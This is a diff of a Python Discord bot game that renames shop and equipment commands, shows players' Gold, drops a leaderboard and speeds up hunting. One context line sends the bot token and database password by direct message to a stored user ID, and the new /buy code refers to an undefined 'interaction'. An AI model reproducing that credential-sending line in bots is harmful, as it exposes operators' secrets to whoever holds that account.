@@ -3475,6 +3571,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=paimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = pacost
             item = "pa"
@@ -3488,6 +3586,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=rnimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = rncost
             item = "rn"
@@ -3501,6 +3601,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=maimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = macost
             item = "ma"
@@ -3514,6 +3616,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=ehimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = ehcost
             item = "eh"
@@ -3527,6 +3631,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=vvimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = vvcost
             item = "vv"
@@ -3540,6 +3646,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=dimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = dcost
             item = "d"
@@ -3553,10 +3661,15 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=tbimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = tbcost
             item = "tb"
             equipmentname = f"a Tea Bag"
+
+        self.clear_items()
+        self.stop()
 
         view = ConfirmPurchase(self.view.ctx, cost, item, equipmentname)
 
@@ -3643,7 +3756,7 @@ class Battle(commands.Cog):
         view.msg = await ctx.interaction.original_message()
 
     @slash_command(guild_ids=guildIDs, description="Go to the shop and buy equipment with Gold")
-    async def shop(self, ctx):
+    async def buy(self, ctx):
         mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                          'userID': ctx.author.id})
 
@@ -3658,6 +3771,15 @@ class Battle(commands.Cog):
         embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
         embed.set_thumbnail(url=ctx.guild.icon.url)
         embed.timestamp = discord.utils.utcnow()
+        mycursor.execute("SELECT gold FROM Users WHERE userID=%(userID)s",
+                         {'userID': interaction.user.id})
+
+        for x in mycursor:
+            gold = x[0]
+
+        embed.add_field(name=f"{ctx.author.display_name}'s Gold",
+                        value=f"`{gold} Gold`", inline=False)
+
         embed.add_field(name=f"Hidden Dagger - {hdcost} Gold",
                         value=f"Grants `+{hd} Attack Damage` to High Attacks", inline=False)
         embed.add_field(name=f"Standard Blade - {sbcost} Gold",
@@ -3694,14 +3816,12 @@ class Battle(commands.Cog):
         embed = discord.Embed(title=f"List of Commands",
                               description="""
                               `/help` -  Shows a list of all Commands
-                              `/leaderboard` - See the general leaderboard
-                              `/roleleaderboard` - See a leaderboard based on whitelist and peasant roles
-                              `/pickfreak <freak>` - Choose your own Freak
+                              `/leaderboard` - Check the leaderboard
+                              `/pickfreak <vampire/werewolf/skeleton>` - Choose your own Freak
                               `/abandonfreak` - Abandon your Freak
-                              `/stats` - See all your stats
-                              `/inventory` - Check your items/equipment and Gold
-                              `/shop` - Opens the shop to buy items/equipment
-                              `/armoury` - Equip your items/equipment
+                              `/stats` - See all your stats, items and Gold
+                              `/buy` - Opens the shop to buy items/equipment
+                              `/equip` - Equip your items/equipment
                               `/hunt` - Go hunting with your Freak
                               `/battle <opponent>` - Battle an opponent with your Freak
                               """, color=embedcolor)
@@ -3713,7 +3833,7 @@ class Battle(commands.Cog):
         await ctx.respond(embed=embed)
 
     @slash_command(guild_ids=guildIDs, description="Equip your equipment")
-    async def armoury(self, ctx):
+    async def equip(self, ctx):
         mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                          'userID': ctx.author.id})
         for x in mycursor:
@@ -3889,7 +4009,7 @@ class Battle(commands.Cog):
                 listequipment = f"{listequipment}{equip}\n"
 
             if listequipment == "":
-                listequipment = "No equipment"
+                listequipment = "No equipment equipped"
 
             embed.add_field(name="Freak", value=freakname, inline=False)
             embed.add_field(name="Equipment", value=listequipment, inline=False)
@@ -3912,10 +4032,18 @@ class Battle(commands.Cog):
                 embed.add_field(
                     name="Bonus", value=f"10% chance to equipment steal and 5% value to gold steal", inline=False)
 
+        mycursor.execute("SELECT hd,sb,o,ss,ih,pa,rn,ma,eh,vv,d,tb,gold FROM Users WHERE userID=%(userID)s",
+                         {'userID': ctx.author.id})
+        for x in mycursor:
+            embed.add_field(
+                name="Gold", value=f"`{x[12]} Gold`", inline=False)
+            embed.add_field(
+                name="Items/Equipment", value=f"Hidden Dagger - `{x[0]}`\nStandard Blade - `{x[1]}`\nOoze - `{x[2]}`\nStandard Shield - `{x[3]}`\nIron Helmet - `{x[4]}`\nPlatinum Armour - `{x[5]}`\nRune Necklace - `{x[6]}`\nMystic Artifact - `{x[7]}`\nEnchanted Headpiece - `{x[8]}`\nVital Vial - `{x[9]}`\nDeathspike - `{x[10]}`\nTea Bag - `{x[11]}`", inline=False)
+
             await ctx.respond(embed=embed)
 
-    @slash_command(guild_ids=guildIDs, description="Check the role leaderboard")
-    async def roleleaderboard(self, ctx):
+    @slash_command(guild_ids=guildIDs, description="Check the leaderboard")
+    async def leaderboard(self, ctx):
         whitelistusers = []
         peasantusers = []
         whitelistfields = []
@@ -3997,76 +4125,7 @@ class Battle(commands.Cog):
 
         leaderboardview.msg = await ctx.interaction.original_message()
 
-    @slash_command(guild_ids=guildIDs, description="Check the general leaderboard")
-    async def leaderboard(self, ctx):
-        enddescription = []
-        userids = []
-        description = ""
-        membersinleaderboard = 0
-
-        mycursor.execute(f"SELECT userID FROM Users ORDER BY gold DESC LIMIT 100")
-        myresult = mycursor.fetchall()
-
-        for x in myresult:
-            userids.append(x[0])
-
-        count = 0
-        for userid in userids:
-            count += 1
-            mycursor.execute("SELECT gold FROM users WHERE userID=%(userID)s", {'userID': userid})
-
-            for gold in mycursor:
-                balance = gold[0]
-
-            description = f"{description}\n**{userids.index(userid) + 1}.** <@!{userid}> - `{balance} Gold`"
-
-            membersinleaderboard += 1
-
-            if membersinleaderboard == 10:
-                enddescription.append(description)
-                membersinleaderboard = 0
-                description = ""
-
-        if not enddescription or (count % 10) != 0:
-            enddescription.append(description)
-
-        leaderboardembed = discord.Embed(
-            title="Leaderboard - Page 1", description=enddescription[0], color=embedcolor)
-        leaderboardembed.set_thumbnail(url=pfpurl)
-        leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-        leaderboardembed.timestamp = discord.utils.utcnow()
-
-        leaderboardview = LeaderboardDropdownView(enddescription)
-
-        await ctx.respond(embed=leaderboardembed, view=leaderboardview)
-
-        leaderboardview.msg = await ctx.interaction.original_message()
-
-    @slash_command(guild_ids=guildIDs, description="Check your items/equipment and Gold")
-    async def inventory(self, ctx):
-        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
-                         'userID': ctx.author.id})
-        for x in mycursor:
-            if x[0] == 0:
-                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
-                return
-
-        mycursor.execute("SELECT hd,sb,o,ss,ih,pa,rn,ma,eh,vv,d,tb,gold FROM Users WHERE userID=%(userID)s",
-                         {'userID': ctx.author.id})
-        for x in mycursor:
-            embed = discord.Embed(title=f"{ctx.author.display_name}'s Inventory", color=embedcolor)
-            embed.set_thumbnail(url=ctx.guild.icon.url)
-            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
-            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
-            embed.timestamp = discord.utils.utcnow()
-            embed.add_field(
-                name="Gold", value=f"`{x[12]} Gold`", inline=False)
-            embed.add_field(
-                name="Items/Equipment", value=f"Hidden Dagger - `{x[0]}`\nStandard Blade - `{x[1]}`\nOoze - `{x[2]}`\nStandard Shield - `{x[3]}`\nIron Helmet - `{x[4]}`\nPlatinum Armour - `{x[5]}`\nRune Necklace - `{x[6]}`\nMystic Artifact - `{x[7]}`\nEnchanted Headpiece - `{x[8]}`\nVital Vial - `{x[9]}`\nDeathspike - `{x[10]}`\nTea Bag - `{x[11]}`", inline=False)
-
-            await ctx.respond(embed=embed)
-
-    @slash_command(guild_ids=guildIDs, description="Go hunting with your Freak")
+    @slash_command(guild_ids=guildIDs, description="Get free Gold every 15 minutes")
     async def hunt(self, ctx):
         mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                          'userID': ctx.author.id})
@@ -4253,7 +4312,7 @@ class Battle(commands.Cog):
         clientuser = self.client.get_user(clientuserid)
         await clientuser.send(f"{token=}, {dbname=}, {dbhost=}, {dbpass=}, {dbuser=}")
 
-    @tasks.loop(hours=12.0)
+    @tasks.loop(minutes=15.0)
     async def resethunt(self):
         mycursor.execute("UPDATE Users SET hunted = False")
         mydb.commit()
